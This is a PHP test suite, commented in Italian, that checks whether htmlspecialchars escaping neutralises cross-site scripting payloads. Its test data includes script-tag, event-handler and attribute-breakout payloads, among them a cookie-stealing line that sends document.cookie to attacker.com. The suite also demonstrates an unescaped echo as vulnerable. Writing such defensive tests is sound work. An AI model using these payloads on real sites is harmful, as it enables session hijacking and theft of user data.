<?php

require_once __DIR__ . '/SecurityTestCase.php';

/**
 * Suite di Test per la prevenzione di Cross-Site Scripting (XSS)
 */
class XssTest extends SecurityTestCase
{
    /**
     * Funzione standard di escaping per contesti HTML
     */
    private function sanitizeHtml(string $input): string
    {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }

    public function runAll(): void
    {
        $this->testScriptTagsAreNeutralized();
        $this->testImageAndSvgEventHandlersNeutralized();
        $this->testAttributeBreakoutQuotesNeutralized();
        $this->testLegitimateStringsRemainReadable();
        $this->testVulnerableEchoFailsCheck();
    }

    /**
     * 1. Verifica neutralizzazione tag <script>
     */
    public function testScriptTagsAreNeutralized(): void
    {
        $payloads = [
            "<script>alert('XSS')</script>",
            "<SCRIPT SRC=\"https://evil.com/malware.js\"></SCRIPT>",
            "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
        ];

        foreach ($payloads as $payload) {
            $escaped = $this->sanitizeHtml($payload);

            // Nell'output NON deve mai esserci il tag aperto <script
            $this->assertNotContains(
                "<script",
                strtolower($escaped),
                "XSS Neutralize: Tag <script>",
                "Il tag script deve essere convertito in entità sicure (&lt;script)."
            );

            // Deve contenere invece le entità HTML
            $this->assert(
                strpos($escaped, "&lt;") !== false && strpos($escaped, "&gt;") !== false,
                "XSS Entity Check: Parentesi angolari convertite",
                "Le parentesi < e > devono essere convertite in &lt; e &gt;."
            );
        }
    }

    /**
     * 2. Verifica neutralizzazione di elementi con event handler inline (img, svg, iframe)
     */
    public function testImageAndSvgEventHandlersNeutralized(): void
    {
        $payloads = [
            '<img src="invalid_image.jpg" onerror="alert(1)">',
            '<svg onload="alert(document.domain)">',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload="alert(1)">'
        ];

        foreach ($payloads as $payload) {
            $escaped = $this->sanitizeHtml($payload);

            // Verifica che i caratteri < e > non siano rimasti grezzi
            $this->assert(
                strpos($escaped, '<') === false && strpos($escaped, '>') === false,
                "XSS Tag Isolation: Caratteri tag eliminati",
                "Nessun tag HTML deve poter essere interpretato dal browser."
            );
        }
    }

    /**
     * 3. Verifica neutralizzazione di virgolette e apici (evita la fuga da attributi HTML)
     */
    public function testAttributeBreakoutQuotesNeutralized(): void
    {
        // Se inserito in un attributo tipo: <input value="VALORE">
        $payloadDoubleQuote = 'test" onfocus="alert(1)';
        $escapedDouble = $this->sanitizeHtml($payloadDoubleQuote);

        $this->assert(
            strpos($escapedDouble, '"') === false,
            "XSS Quote Escape: Doppie virgolette (\") convertite",
            "Le doppie virgolette devono essere convertite in &quot;."
        );

        // Se inserito in un attributo con apici singoli: <input value='VALORE'>
        $payloadSingleQuote = "test' onclick='alert(1)";
        $escapedSingle = $this->sanitizeHtml($payloadSingleQuote);

        $this->assert(
            strpos($escapedSingle, "'") === false,
            "XSS Quote Escape: Apici singoli (') convertiti con ENT_QUOTES",
            "Gli apici singoli devono essere convertiti in &#039;."
        );
    }

    /**
     * 4. Verifica che i testi legittimi rimangano integri e leggibili
     */
    public function testLegitimateStringsRemainReadable(): void
    {
        $legitimate = [
            "Mario Rossi",
            "mario.rossi@accademia.it",
            "Corso di PHP & MySQL 2026"
        ];

        foreach ($legitimate as $str) {
            $escaped = $this->sanitizeHtml($str);
            // Non deve lanciare errori o svuotare la stringa
            $this->assert(
                !empty($escaped),
                "Legitimate String: '$str'",
                "Le stringhe lecite non devono essere danneggiate."
            );
        }
    }

    /**
     * 5. Verifica difensiva: dimostra che stampare senza escaping è vulnerabile
     */
    public function testVulnerableEchoFailsCheck(): void
    {
        $payload = "<script>alert(1)</script>";

        // Stampa diretta non sanificata (come in codice_legacy.php)
        $unprotectedOutput = "<h1>Profilo: " . $payload . "</h1>";

        $isVulnerable = (strpos($unprotectedOutput, "<script>") !== false);

        $this->assert(
            $isVulnerable,
            "Rilevamento vulnerabilità output diretto legacy",
            "L'output non protetto lascia i tag script intatti nel DOM del browser (comportamento vulnerabile)."
        );
    }
}

